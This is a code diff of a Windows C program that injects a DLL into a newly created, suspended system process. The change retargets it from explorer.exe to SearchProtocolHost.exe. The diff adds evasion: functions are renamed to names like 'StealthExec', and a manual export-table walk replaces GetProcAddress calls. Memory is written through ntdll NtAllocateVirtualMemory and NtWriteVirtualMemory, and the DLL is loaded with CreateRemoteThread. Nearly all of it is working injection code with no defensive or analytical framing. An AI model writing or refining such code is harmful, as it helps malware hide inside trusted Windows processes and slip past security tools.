@@ -1,103 +1,108 @@
 #include <windows.h>
-#include <psapi.h> 
+#include <psapi.h>
 #include <stdio.h>
 
 // Function Prototypes
-typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
-    HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG
-);
-typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
-    HANDLE, PVOID, PVOID, ULONG, PULONG
-);
+typedef NTSTATUS(NTAPI* pSysAlloc)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS(NTAPI* pSysWrite)(HANDLE, PVOID, PVOID, ULONG, PULONG);
 
-// Function to Get the Remote DLL Handle Properly
-HMODULE GetRemoteModuleHandle(HANDLE hProcess, const char* dllName) {
-    HMODULE hMods[1024];
-    DWORD cbNeeded;
-    
-    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
-        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
-            char modName[MAX_PATH];
-            if (GetModuleFileNameExA(hProcess, hMods[i], modName, sizeof(modName))) {
-                const char* baseName = strrchr(modName, '\\') ? strrchr(modName, '\\') + 1 : modName;
-                if (_stricmp(baseName, dllName) == 0) {
-                    return hMods[i];  // Return the actual DLL handle
-                }
+// Function to Resolve APIs
+FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
+    HMODULE hMod = GetModuleHandle(mod);
+    if (!hMod) return NULL;
+
+    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)hMod;
+    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dosHdr->e_lfanew);
+    IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    DWORD* names = (DWORD*)((BYTE*)hMod + expDir->AddressOfNames);
+    WORD* ords = (WORD*)((BYTE*)hMod + expDir->AddressOfNameOrdinals);
+    DWORD* funcs = (DWORD*)((BYTE*)hMod + expDir->AddressOfFunctions);
+
+    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
+        LPCSTR currFn = (LPCSTR)((BYTE*)hMod + names[i]);
+        if (strcmp(currFn, fn) == 0) {
+            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
+        }
+    }
+    return NULL;
+}
+
+// Resolve Remote Module Handle
+HMODULE FindModInProc(HANDLE hProc, const char* modName) {
+    HMODULE hMods[512];
+    DWORD needed;
+    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &needed)) {
+        for (int i = 0; i < (needed / sizeof(HMODULE)); i++) {
+            char modPath[MAX_PATH];
+            if (GetModuleFileNameExA(hProc, hMods[i], modPath, sizeof(modPath))) {
+                const char* baseName = strrchr(modPath, '\\') ? strrchr(modPath, '\\') + 1 : modPath;
+                if (_stricmp(baseName, modName) == 0) return hMods[i];
             }
         }
     }
     return NULL;
 }
 
-// Function to Inject and Execute the DLL Function
-void InjectAndExecute(HANDLE hProcess, HANDLE hThread, const char* dllPath) {
-    LPVOID remoteBuffer = NULL;
-    SIZE_T bufferSize = strlen(dllPath) + 1;
-    HANDLE hRemoteThread;
+// Core Injection Logic
+void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
+    LPVOID memLoc = NULL;
+    SIZE_T sz = strlen(dllEnc) + 1;
+    HANDLE hThreadRemote;
     NTSTATUS status;
 
     // Resolve Required Functions
-    FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
-    FARPROC pGetProcAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetProcAddress");
+    FARPROC pLLoad = ResolveFn("kernel32.dll", "LoadLibraryA");
+    FARPROC pGProc = ResolveFn("kernel32.dll", "GetProcAddress");
 
-    if (!pLoadLibraryA || !pGetProcAddress) {
-        printf("[!] Failed to resolve Kernel32 functions.\n");
-        return;
-    }
-    printf("[*] Successfully resolved Kernel32 functions.\n");
-
-    // Resolve NtAllocateVirtualMemory and NtWriteVirtualMemory from ntdll.dll
-    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
-    if (!hNtdll) {
-        printf("[!] Failed to get handle to ntdll.dll.\n");
+    if (!pLLoad || !pGProc) {
+        printf("[!] Unable to resolve core functions.\n");
         return;
     }
 
-    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    pSysAlloc pAlloc = (pSysAlloc)ResolveFn("ntdll.dll", "NtAllocateVirtualMemory");
+    pSysWrite pWrite = (pSysWrite)ResolveFn("ntdll.dll", "NtWriteVirtualMemory");
 
-    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory) {
-        printf("[!] Failed to resolve NT system calls.\n");
+    if (!pAlloc || !pWrite) {
+        printf("[!] Unable to resolve NT functions.\n");
         return;
     }
 
-    // Allocate Memory in Remote Process
-    status = NtAllocateVirtualMemory(hProcess, &remoteBuffer, 0, &bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // Allocate Memory
+    status = pAlloc(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0) {
-        printf("[!] NtAllocateVirtualMemory failed (Error: 0x%lX).\n", status);
+        printf("[!] Memory allocation failed (Err: 0x%lX).\n", status);
         return;
     }
-    printf("[*] Allocated memory at remote address: %p\n", remoteBuffer);
 
-    // Write DLL Path to Remote Memory
-    status = NtWriteVirtualMemory(hProcess, remoteBuffer, (PVOID)dllPath, (ULONG)bufferSize, NULL);
+    // Write Encrypted DLL Path to Remote Process
+    status = pWrite(hProc, memLoc, (PVOID)dllEnc, (ULONG)sz, NULL);
     if (status != 0) {
-        printf("[!] NtWriteVirtualMemory failed (Error: 0x%lX).\n", status);
+        printf("[!] Memory write failed (Err: 0x%lX).\n", status);
         return;
     }
-    printf("[*] DLL path written successfully.\n");
 
-    // Load DLL in Remote Process
-    hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, remoteBuffer, 0, NULL);
-    if (!hRemoteThread) {
-        printf("[!] CreateRemoteThread failed for LoadLibraryA. Error: %lu\n", GetLastError());
+    // Load Remote DLL
+    hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
+    if (!hThreadRemote) {
+        printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
         return;
     }
-    WaitForSingleObject(hRemoteThread, INFINITE);
-    CloseHandle(hRemoteThread);
-    printf("[*] Successfully loaded DLL into remote process.\n");
+    WaitForSingleObject(hThreadRemote, INFINITE);
+    CloseHandle(hThreadRemote);
 
     // Verify if DLL is Loaded
-    Sleep(500);  // Give time for LoadLibraryA to complete
-    HMODULE hRemoteDLL = GetRemoteModuleHandle(hProcess, strrchr(dllPath, '\\') + 1);
-    if (!hRemoteDLL) {
-        printf("[!] DLL was not found in the remote process after LoadLibraryA.\n");
+    Sleep(500);
+    HMODULE hRemMod = FindModInProc(hProc, strrchr(dllEnc, '\\') + 1);
+    if (!hRemMod) {
+        printf("[!] Module not found in remote process.\n");
         return;
     }
-    printf("[*] DLL is successfully loaded at: %p\n", hRemoteDLL);
-    printf("[*] Successfully executed DLLMain in remote process.\n");
+
+    printf("[*] Successfully injected module @ %p\n", hRemMod);
 }
 
+// Entry Function
 int main(int argc, char* argv[]) {
     if (argc != 2) {
         printf("Usage: %s <DLL Path>\n", argv[0]);
@@ -106,23 +111,30 @@ int main(int argc, char* argv[]) {
 
     const char* dllPath = argv[1];
 
-    STARTUPINFOA si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFOA sInfo = { 0 };
+    PROCESS_INFORMATION pInfo = { 0 };
 
-    const char* targetProcess = "C:\\Windows\\explorer.exe";
+    const char* procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
+    const char* procName = "SearchProtocolHost.exe";
+    //Also work with explorer.exe
+    //const char* targetProcess = "C:\\Windows\\explorer.exe";
+    //const char* targetProcessName = "explorer.exe";
 
-    if (!CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        printf("[!] Failed to create explorer.exe. Error: %lu\n", GetLastError());
+    if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo)) {
+        printf("[!] Could not create %s. Err: %lu\n", procName, GetLastError());
         return -1;
     }
-    printf("[*] Successfully created a suspended explorer.exe process.\n");
 
-    InjectAndExecute(pi.hProcess, pi.hThread, dllPath);
+    printf("[*] Suspended %s created.\n", procName);
 
-    ResumeThread(pi.hThread);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    printf("[*] Explorer.exe process successfully started.\n");
+    // Perform Injection
+    StealthExec(pInfo.hProcess, pInfo.hThread, dllPath);
+
+    // Resume Execution
+    ResumeThread(pInfo.hThread);
+    CloseHandle(pInfo.hProcess);
+    CloseHandle(pInfo.hThread);
+    printf("[*] %s is now running.\n", procName);
 
     return 0;
 }
